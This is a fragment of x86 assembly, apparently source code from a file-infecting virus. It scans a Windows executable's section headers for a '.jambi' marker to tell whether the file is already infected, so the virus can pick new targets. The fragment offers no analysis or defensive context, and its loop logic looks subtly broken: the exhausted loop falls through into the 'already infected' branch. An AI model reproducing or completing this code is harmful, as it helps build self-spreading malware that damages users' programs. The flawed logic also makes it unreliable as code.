.code
isHealthy:
	mov	ecx, edx
	mov	ebx, [ebp - 16]

	nop
	add	ebx, 248

isHealthy_loop:
	or	ecx, ecx
	je	isHealthy_endloop

	mov	[ebp - 2812], ecx

	push	7
	push	dword ptr [ebp - 504] 		; ".jambi"
	push	ebx
	call	dword ptr [ebp - 288] 		; crt_strncmp

	or	eax, eax
	je	already_infected

	mov	ecx, [ebp - 2812]	; restaure ecx

	nop
	add	ebx, 40
	loop	isHealthy_loop

	already_infected:
	nop
	mov	eax, 0
	jmp	end_isHealthy

	isHealthy_endloop:
	mov	eax, 1

jmp	end_isHealthy
